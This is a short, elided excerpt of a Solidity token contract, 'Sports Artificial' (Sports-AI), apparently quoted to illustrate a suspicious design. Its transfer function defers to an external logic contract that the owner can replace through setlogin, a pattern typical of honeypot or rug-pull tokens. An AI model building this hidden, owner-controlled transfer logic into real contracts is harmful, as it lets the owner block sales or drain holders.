...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Sports Artificial';
    string constant public symbol = 'Sports-AI';
    ...
    ILogic private logic = ILogic(address(logic));
    ...
    function _transfer(address from, address to, uint value) internal {
        ...
        uint256 _bamount = logic._isPETOKAICarrot(from);
    ...
    function setlogin(address _address) external onlyOwner {
